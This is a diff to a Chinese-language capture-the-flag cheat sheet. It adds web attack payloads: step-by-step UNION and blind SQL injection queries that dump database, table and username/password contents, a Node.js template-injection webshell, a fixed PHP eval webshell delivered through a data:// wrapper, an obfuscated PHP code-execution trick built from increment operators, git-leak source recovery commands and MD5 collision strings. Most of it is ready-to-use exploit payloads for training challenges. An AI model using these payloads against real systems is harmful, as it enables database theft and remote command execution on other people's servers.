@@ -77,6 +77,8 @@
 ### Web
 
 - localhost绕过：127.0.0.1  >>> 2130706433 https://www.browserling.com/tools/ip-to-dec
+- .git 信息泄露：https://github.com/BugScanTeam/GitHack
+- .svn/.hg/.cvs 信息泄露：https://github.com/kost/dvcs-ripper
 
 ### Pwn
 
@@ -107,6 +109,16 @@ grep -rn “flag{” /*
 
 ```
 find / -type f -name '*' | xargs grep "flag{"
+```
+
+#### MD5碰撞
+
+```
+%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+```
+
+```
+%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
 ```
 
 ### Crypto
@@ -541,6 +553,12 @@ java -jar ZipCenOp.jar xxx.zip
 <?php @eval($_POST['shell']);?>
 ```
 
+##### Nodejs Webshell
+
+```
+<%= process.mainModule.require("child_process").execSync("cat /flag").toString() %>
+```
+
 ##### 利用/proc目录获取信息
 
 ```
@@ -558,6 +576,28 @@ cat /proc/self/environ
 # 获取当前启动进程的完整命令
 cat /proc/self/cmdline
 ```
+
+#### 信息泄露
+
+##### .git 信息泄露
+
+```
+# 1. 恢复源码
+python githack.py http://target.com
+
+# 2. 查看log
+git log
+
+# 3. git reset恢复版本 / git stash还原文件
+git reset --hard 053dxxxxxxxxxxxxxxxxxxxxxxxxxxx645f
+或：
+git stash list
+git stash pop
+```
+
+##### .svn 信息泄露
+
+- 
 
 #### localhost绕过
 
@@ -627,11 +667,101 @@ index.php?path=php://filter/read=convert.base64-encode/resource=flag.php
 
 #### SQL注入
 
+SQL注入流程：判断注入点→判断字段个数→获取数据库名→获取表名→获取字段名→获取表内容。
+
 ```
 admin' or 1=1 --  # --后加空格
 ```
 
-#### PHP伪协议
+##### union注入
+
+```
+1. 判断列数
+?id=1 order by 3
+```
+
+```
+2. 判断回显
+?id=-1 union select 1,2,3
+```
+
+```
+3. 获取当前数据库
+?id=-1 union select 1,2,database()
+```
+
+```
+4. 获取所有库名
+?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata
+```
+
+```
+5. 获取数据表名
+?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test'
+```
+
+```
+6. 获取列名
+?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='test' and table_name='users'
+```
+
+```
+7. 获取字段信息
+?id=-1 union select 1,2,group_concat(username,'~',password) from test.users
+```
+
+##### 盲注
+
+```
+1. 测试语句
+?id=1 and 1=1
+?id=1 and 1=2
+```
+
+```
+2. 判断库名长度
+?id=1 and length(database())=5
+```
+
+```
+3. 二分法获取库名
+?id=1 and ascii(substr(database(),1,1))>120
+?id=1 and ascii(substr(database(),1,1))=120
+```
+
+```
+4. 判断表的数量
+?id=1 and (select count(*) tables from information_schema.tables where table_schema='test')=4
+```
+
+```
+5. 获取表名长度
+?id=1 and length((select table_name from information_schema.tables where table_schema='test' limit 0,1))=6
+```
+
+```
+6. 获取表名
+?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema='test' limit 0,1),1,1))=101
+```
+
+```
+7. 判断列数
+?id=1 and (select count(*) columns from information_schema.columns where table_schema='test' and table_name='users')=3
+```
+
+```
+8. 获取第一列名长度
+?id=1 and length((select column_name from information_schema.columns where table_schema='test' and table_name='users' limit 0,1))=2
+```
+
+```
+9. 获取列名
+?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema='test' and table_name='users' limit 0,1),1,1))=120
+```
+
+#### PHP
+
+##### php伪协议
 
 file协议：
 
@@ -678,7 +808,26 @@ echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo=');
 http://ip:port/readme.php?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==
 
 # 也可以将webshell进行base64编码/或不编码
-http://ip:port/readme.php?filename=data://text/plain;base64,<?php eval($_POST["cmd"];)?>
+http://ip:port/readme.php?filename=data://text/plain;base64,<?php eval($_POST["cmd"]);?>
+```
+
+##### php自增绕过
+
+```
+$_=(_/_._)[1];//A
+$_++;//B
+$_++;//C
+$_1=++$_;//D
+$_2=++$_1;//E
+$_2++;//F
+$_=(_/_._){0};//N
+$_++;
+$_++;
+$_++;
+$_++;
+$_++;
+$_=_.++$_2.$_1.++$_;
+$$_{1}($$_{2});//$_GET{1}($_GET{2})
 ```
 
 ### Pwn
